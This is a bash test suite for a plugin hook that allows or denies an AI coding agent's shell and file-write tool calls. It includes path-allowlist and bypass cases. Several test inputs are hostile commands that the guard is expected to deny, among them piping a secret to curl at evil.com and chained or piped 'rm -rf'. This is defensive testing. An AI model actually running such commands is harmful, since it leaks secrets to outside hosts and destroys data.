#!/usr/bin/env bash
# =============================================================================
# Sidekick Plugin — v1.3 Coverage Tests
# =============================================================================
# Covers all 8 ENF fixes, PATH-01/02/03 path allowlist, and lib isolation.
# Modeled on tests/test_v12_coverage.bash.
#
# Sections:
#   TEST-V13-04: Library isolation (enforcer-utils.sh sources cleanly)
#   TEST-V13-01: ENF-01 through ENF-08 unit tests (allow + deny per fix)
#   TEST-V13-02: PATH-01/02/03 path allowlist tests
# =============================================================================

set -euo pipefail

PASS=0; FAIL=0
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PLUGIN_DIR="$(dirname "$SCRIPT_DIR")"
ENFORCER="${PLUGIN_DIR}/hooks/forge-delegation-enforcer.sh"
LIB_UTILS="${PLUGIN_DIR}/hooks/lib/enforcer-utils.sh"

green='\033[0;32m'; red='\033[0;31m'; reset='\033[0m'
pass() { echo -e "${green}PASS${reset} $1"; PASS=$((PASS+1)); }
fail() { echo -e "${red}FAIL${reset} $1: $2"; FAIL=$((FAIL+1)); }

[ -f "$ENFORCER" ] || { echo "ERROR: $ENFORCER not found"; exit 1; }
[ -f "$LIB_UTILS" ] || { echo "ERROR: $LIB_UTILS not found"; exit 1; }

HOME_SBX="$(mktemp -d)"
PROJ_SBX="$(mktemp -d)"
STUB_DIR="$HOME_SBX/bin"
TEST_SESSION_ID="forge-test-$$"
MARKER_DIR="$HOME_SBX/.claude/sessions/${TEST_SESSION_ID}"
MARKER_FILE="${MARKER_DIR}/.forge-delegation-active"
trap 'rm -rf "$HOME_SBX" "$PROJ_SBX"' EXIT
mkdir -p "$MARKER_DIR" "$STUB_DIR"

cat > "$STUB_DIR/forge" <<'STUB'
#!/usr/bin/env bash
exit 0
STUB
chmod +x "$STUB_DIR/forge"

touch "$MARKER_FILE"

STUB_PATH="$STUB_DIR:$PATH"

run_enf() {
  HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" \
    SIDEKICK_TEST_SESSION_ID="$TEST_SESSION_ID" \
    bash "$ENFORCER" <<< "$1" 2>/dev/null
}

# =============================================================================
# TEST-V13-04: Library isolation
# =============================================================================

# test_lib_sources_in_isolation
# Sourcing enforcer-utils.sh directly must not trigger main() or any side
# effects — only function definitions are loaded.
echo "=== test_lib_sources_in_isolation ==="
_iso_out="$(bash -c "source '${LIB_UTILS}' && echo sourced_ok" 2>/dev/null)"
if [ "$_iso_out" = "sourced_ok" ]; then
  pass "test_lib_sources_in_isolation"
else
  fail "test_lib_sources_in_isolation" "expected 'sourced_ok', got: '$_iso_out'"
fi

# test_lib_double_source_idempotent
# Sourcing twice must produce no errors — source-guard prevents double-sourcing.
echo "=== test_lib_double_source_idempotent ==="
_dbl_out="$(bash -c "
  source '${LIB_UTILS}'
  source '${LIB_UTILS}'
  echo double_ok
" 2>/dev/null)"
if [ "$_dbl_out" = "double_ok" ]; then
  pass "test_lib_double_source_idempotent"
else
  fail "test_lib_double_source_idempotent" "expected 'double_ok', got: '$_dbl_out'"
fi

# =============================================================================
# TEST-V13-01 — ENF-01: process substitution flagged as write redirect
# =============================================================================

echo "=== test_enf01_process_sub_is_write_redirect ==="
_out="$(run_enf '{"tool_name":"Bash","tool_input":{"command":"tee >(cat)"}}')"
_dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
if [ "$_dec" = "deny" ]; then
  pass "test_enf01_process_sub_is_write_redirect"
else
  fail "test_enf01_process_sub_is_write_redirect" "dec='$_dec' out='$_out'"
fi

echo "=== test_enf01_process_sub_control ==="
_out="$(run_enf '{"tool_name":"Bash","tool_input":{"command":"cat file.txt | grep pattern"}}')"
if [ -z "$_out" ]; then
  pass "test_enf01_process_sub_control (plain pipe: no redirect)"
else
  fail "test_enf01_process_sub_control" "expected empty, got: '$_out'"
fi

# =============================================================================
# TEST-V13-01 — ENF-02: fd-redirects NOT flagged
# =============================================================================

echo "=== test_enf02_fd_redirect_passthrough ==="
_all=1
for _c in 'ls >&1' 'ls >&2' 'ls >&-' 'ls 2>&1 >/dev/null'; do
  _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
  _out="$(run_enf "$_j")"
  if [ -n "$_out" ]; then
    fail "test_enf02_fd_redirect_passthrough[$_c]" "expected empty, got: '$_out'"
    _all=0
  fi
done
[ "$_all" = "1" ] && pass "test_enf02_fd_redirect_passthrough"

echo "=== test_enf02_real_redirect_still_denied ==="
_out="$(run_enf '{"tool_name":"Bash","tool_input":{"command":"echo hi > /tmp/out"}}')"
_dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
if [ "$_dec" = "deny" ]; then
  pass "test_enf02_real_redirect_still_denied"
else
  fail "test_enf02_real_redirect_still_denied" "dec='$_dec' out='$_out'"
fi

# =============================================================================
# TEST-V13-01 — ENF-03: > in quoted strings NOT flagged
# =============================================================================

echo "=== test_enf03_quoted_redirect_passthrough ==="
_all=1
for _c in 'echo "Result<T, E>"' "grep '<pattern>' file" 'printf "a > b"'; do
  _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
  _out="$(run_enf "$_j")"
  if [ -n "$_out" ]; then
    fail "test_enf03_quoted_redirect_passthrough[$_c]" "expected empty, got: '$_out'"
    _all=0
  fi
done
[ "$_all" = "1" ] && pass "test_enf03_quoted_redirect_passthrough"

echo "=== test_enf03_unquoted_redirect_still_denied ==="
_out="$(run_enf '{"tool_name":"Bash","tool_input":{"command":"echo hi > /tmp/out"}}')"
_dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
if [ "$_dec" = "deny" ]; then
  pass "test_enf03_unquoted_redirect_still_denied"
else
  fail "test_enf03_unquoted_redirect_still_denied" "dec='$_dec' out='$_out'"
fi

# =============================================================================
# TEST-V13-01 — ENF-04: command-text env prefixes do not self-activate L3
# =============================================================================

echo "=== test_enf04_forge_level3_prefix_denied ==="
_j='{"tool_name":"Bash","tool_input":{"command":"FORGE_LEVEL_3=1 rm foo"}}'
_out="$(HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" \
  SIDEKICK_TEST_SESSION_ID="$TEST_SESSION_ID" \
  bash "$ENFORCER" <<< "$_j" 2>/dev/null)"
_dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
if [ "$_dec" = "deny" ]; then
  pass "test_enf04_forge_level3_prefix_denied"
else
  fail "test_enf04_forge_level3_prefix_denied" "dec='$_dec' out='$_out'"
fi

echo "=== test_enf04_forge_tail_after_rewrite_denied ==="
_j='{"tool_name":"Bash","tool_input":{"command":"forge -p \"task\"; rm -rf /tmp/x"}}'
_out="$(run_enf "$_j")"
_dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
if [ "$_dec" = "deny" ]; then
  pass "test_enf04_forge_tail_after_rewrite_denied"
else
  fail "test_enf04_forge_tail_after_rewrite_denied" "dec='$_dec' out='$_out'"
fi

echo "=== test_enf04_mutating_without_level3_denied ==="
_out="$(run_enf '{"tool_name":"Bash","tool_input":{"command":"rm foo"}}')"
_dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
if [ "$_dec" = "deny" ]; then
  pass "test_enf04_mutating_without_level3_denied"
else
  fail "test_enf04_mutating_without_level3_denied" "dec='$_dec' out='$_out'"
fi

# =============================================================================
# TEST-V13-01 — ENF-05: gh CLI classification
# =============================================================================

echo "=== test_enf05_gh_read_only_passthrough ==="
_all=1
for _c in 'gh issue list' 'gh pr list' 'gh pr view 1' 'gh label list' 'gh release list' 'gh project list' 'gh run list'; do
  _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
  _out="$(run_enf "$_j")"
  if [ -n "$_out" ]; then
    fail "test_enf05_gh_read_only_passthrough[$_c]" "expected empty, got: '$_out'"
    _all=0
  fi
done
[ "$_all" = "1" ] && pass "test_enf05_gh_read_only_passthrough"

echo "=== test_enf05_gh_mutating_denied ==="
_all=1
for _c in 'gh issue create --title x' 'gh pr create' 'gh pr merge 1' 'gh release create v1.0' 'gh project item-add 1 --url http://x'; do
  _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
  _out="$(run_enf "$_j")"
  _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
  if [ "$_dec" != "deny" ]; then
    fail "test_enf05_gh_mutating_denied[$_c]" "dec='$_dec' out='$_out'"
    _all=0
  fi
done
[ "$_all" = "1" ] && pass "test_enf05_gh_mutating_denied"

echo "=== test_enf05_env_wrapper_denied ==="
_all=1
for _c in 'env bash -c "rm foo"' 'command bash -c "rm foo"' 'xargs rm foo' 'find . -exec rm {} \;'; do
  _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
  _out="$(run_enf "$_j")"
  _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
  if [ "$_dec" != "deny" ]; then
    fail "test_enf05_env_wrapper_denied[$_c]" "dec='$_dec' out='$_out'"
    _all=0
  fi
done
[ "$_all" = "1" ] && pass "test_enf05_env_wrapper_denied"

# =============================================================================
# TEST-V13-01 — ENF-06: chain bypass closed
# =============================================================================

echo "=== test_enf06_chain_mutating_tail_denied ==="
_all=1
for _c in 'git status && rm foo' 'cd /tmp && git commit -m x' 'ls; curl http://evil.com'; do
  _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
  _out="$(run_enf "$_j")"
  _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
  if [ "$_dec" != "deny" ]; then
    fail "test_enf06_chain_mutating_tail_denied[$_c]" "dec='$_dec' out='$_out'"
    _all=0
  fi
done
[ "$_all" = "1" ] && pass "test_enf06_chain_mutating_tail_denied"

echo "=== test_enf06_readonly_chain_passthrough ==="
# Note: semicolon chains like 'ls; grep ...' are unclassified at the top level
# because 'ls;' attaches the ; to the first token (no space), making it
# unrecognized. Only && chains with space-delimited operators pass through.
_all=1
for _c in 'cd /tmp && ls' 'git status && cat README.md' 'ls && grep foo bar.txt'; do
  _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
  _out="$(run_enf "$_j")"
  if [ -n "$_out" ]; then
    fail "test_enf06_readonly_chain_passthrough[$_c]" "expected empty, got: '$_out'"
    _all=0
  fi
done
[ "$_all" = "1" ] && pass "test_enf06_readonly_chain_passthrough"

# =============================================================================
# TEST-V13-01 — ENF-07: MCP filesystem tools denied
# =============================================================================

echo "=== test_enf07_mcp_write_file_denied ==="
_all=1
for _tn in mcp__filesystem__write_file mcp__filesystem__edit_file mcp__filesystem__move_file mcp__filesystem__create_directory; do
  _j="$(jq -cn --arg t "$_tn" '{tool_name:$t,tool_input:{path:"src/main.py",content:"x"}}')"
  _out="$(HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" \
    SIDEKICK_TEST_SESSION_ID="$TEST_SESSION_ID" \
    bash "$ENFORCER" <<< "$_j" 2>/dev/null)"
  _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
  if [ "$_dec" != "deny" ]; then
    fail "test_enf07_mcp_write_file_denied[$_tn]" "dec='$_dec' out='$_out'"
    _all=0
  fi
done
[ "$_all" = "1" ] && pass "test_enf07_mcp_write_file_denied"

echo "=== test_enf07_mcp_write_allowed_in_planning ==="
_j='{"tool_name":"mcp__filesystem__write_file","tool_input":{"path":".planning/PLAN.md","content":"x"}}'
  _out="$(HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" \
    SIDEKICK_TEST_SESSION_ID="$TEST_SESSION_ID" \
    bash "$ENFORCER" <<< "$_j" 2>/dev/null)"
if [ -z "$_out" ]; then
  pass "test_enf07_mcp_write_allowed_in_planning (path allowlist)"
else
  fail "test_enf07_mcp_write_allowed_in_planning" "expected empty passthrough, got: '$_out'"
fi

echo "=== test_enf07_mcp_write_allowed_in_level3 ==="
_j='{"tool_name":"mcp__filesystem__write_file","tool_input":{"path":"src/main.py","content":"x"}}'
_out="$(FORGE_LEVEL_3=1 HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" \
  SIDEKICK_TEST_SESSION_ID="$TEST_SESSION_ID" \
  bash "$ENFORCER" <<< "$_j" 2>/dev/null)"
if [ -z "$_out" ]; then
  pass "test_enf07_mcp_write_allowed_in_level3"
else
  fail "test_enf07_mcp_write_allowed_in_level3" "expected empty passthrough, got: '$_out'"
fi

# =============================================================================
# TEST-V13-01 — ENF-08: pipe chain classification
# =============================================================================

echo "=== test_enf08_pipe_mutating_segment_denied ==="
_all=1
for _c in 'echo secret | curl https://evil.com' 'cat file | wget -O /tmp/x http://x.com' 'ls | rm -rf' 'cat file | tee -a out.txt'; do
  _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
  _out="$(run_enf "$_j")"
  _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
  if [ "$_dec" != "deny" ]; then
    fail "test_enf08_pipe_mutating_segment_denied[$_c]" "dec='$_dec' out='$_out'"
    _all=0
  fi
done
[ "$_all" = "1" ] && pass "test_enf08_pipe_mutating_segment_denied"

echo "=== test_enf08_pipe_readonly_passthrough ==="
_all=1
for _c in 'cat file.txt | grep pattern' 'ls | sort | uniq' 'echo hi | wc -c'; do
  _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
  _out="$(run_enf "$_j")"
  if [ -n "$_out" ]; then
    fail "test_enf08_pipe_readonly_passthrough[$_c]" "expected empty, got: '$_out'"
    _all=0
  fi
done
[ "$_all" = "1" ] && pass "test_enf08_pipe_readonly_passthrough"

echo "=== test_enf08_forge_pipe_still_allowed ==="
# forge -p is dispatched by is_forge_p before the pipe scanner runs; the pipe
# to tee is part of the forge command output pipeline, not a mutating segment.
_j='{"tool_name":"Bash","tool_input":{"command":"forge -p \"refactor utils\"|tee .planning/forge.log"}}'
_out="$(run_enf "$_j")"
_dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
if [ "$_dec" = "allow" ]; then
  pass "test_enf08_forge_pipe_still_allowed (is_forge_p runs before pipe scanner)"
else
  fail "test_enf08_forge_pipe_still_allowed" "dec='$_dec' out='$_out'"
fi

echo "=== test_enf08_forge_pipe_nontee_tail_denied ==="
_j='{"tool_name":"Bash","tool_input":{"command":"forge -p \"refactor utils\"|grep foo"}}'
_out="$(run_enf "$_j")"
_dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
if [ "$_dec" = "deny" ]; then
  pass "test_enf08_forge_pipe_nontee_tail_denied"
else
  fail "test_enf08_forge_pipe_nontee_tail_denied" "dec='$_dec' out='$_out'"
fi

# =============================================================================
# TEST-V13-02 — PATH-01/02/03: path allowlist
# =============================================================================

echo "=== test_path_planning_write_allowed ==="
_all=1
for _fp in '.planning/PLAN.md' '.planning/REQUIREMENTS.md' '.planning/phases/10/10-01-PLAN.md'; do
  _j="$(jq -cn --arg f "$_fp" '{tool_name:"Write",tool_input:{file_path:$f,content:"x"}}')"
  _out="$(run_enf "$_j")"
  if [ -n "$_out" ]; then
    fail "test_path_planning_write_allowed[$_fp]" "expected empty, got: '$_out'"
    _all=0
  fi
done
[ "$_all" = "1" ] && pass "test_path_planning_write_allowed"

echo "=== test_path_docs_write_allowed ==="
_all=1
for _fp in 'docs/index.html' 'docs/help/index.html' 'docs/internal/SECURITY.md'; do
  _j="$(jq -cn --arg f "$_fp" '{tool_name:"Write",tool_input:{file_path:$f,content:"x"}}')"
  _out="$(run_enf "$_j")"
  if [ -n "$_out" ]; then
    fail "test_path_docs_write_allowed[$_fp]" "expected empty, got: '$_out'"
    _all=0
  fi
done
[ "$_all" = "1" ] && pass "test_path_docs_write_allowed"

echo "=== test_path_docs_edit_allowed ==="
_all=1
for _fp in 'docs/index.html' 'docs/help/concepts/index.html'; do
  _j="$(jq -cn --arg f "$_fp" '{tool_name:"Edit",tool_input:{file_path:$f,old_string:"a",new_string:"b"}}')"
  _out="$(run_enf "$_j")"
  if [ -n "$_out" ]; then
    fail "test_path_docs_edit_allowed[$_fp]" "expected empty, got: '$_out'"
    _all=0
  fi
done
[ "$_all" = "1" ] && pass "test_path_docs_edit_allowed"

echo "=== test_path_implementation_files_denied ==="
_all=1
for _fp in 'hooks/enforcer.sh' 'src/main.py' 'skills/forge/SKILL.md' 'install.sh' 'README.md'; do
  _j="$(jq -cn --arg f "$_fp" '{tool_name:"Write",tool_input:{file_path:$f,content:"x"}}')"
  _out="$(run_enf "$_j")"
  _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
  if [ "$_dec" != "deny" ]; then
    fail "test_path_implementation_files_denied[$_fp]" "dec='$_dec' out='$_out'"
    _all=0
  fi
done
[ "$_all" = "1" ] && pass "test_path_implementation_files_denied"

echo "=== test_path_notebook_edit_denied_without_level3 ==="
# NotebookEdit stays denied by default, but L3 takeover may allow it inside the project tree.
_j='{"tool_name":"NotebookEdit","tool_input":{"file_path":".planning/notebook.ipynb","cell_type":"code","source":"x"}}'
_out="$(run_enf "$_j")"
_dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
if [ "$_dec" = "deny" ]; then
  pass "test_path_notebook_edit_denied_without_level3"
else
  fail "test_path_notebook_edit_denied_without_level3" "dec='$_dec' out='$_out'"
fi

echo "=== test_path_notebook_edit_allowed_in_level3 ==="
_j='{"tool_name":"NotebookEdit","tool_input":{"file_path":"src/notebook.ipynb","cell_type":"code","source":"x"}}'
_out="$(FORGE_LEVEL_3=1 HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" \
  SIDEKICK_TEST_SESSION_ID="$TEST_SESSION_ID" \
  bash "$ENFORCER" <<< "$_j" 2>/dev/null)"
if [ -z "$_out" ]; then
  pass "test_path_notebook_edit_allowed_in_level3"
else
  fail "test_path_notebook_edit_allowed_in_level3" "expected empty passthrough, got: '$_out'"
fi

# -----------------------------------------------------------------------------
echo ""
echo "======================================="
echo "Results: $PASS passed, $FAIL failed"
echo "======================================="
[ "$FAIL" -eq 0 ] && exit 0 || exit 1
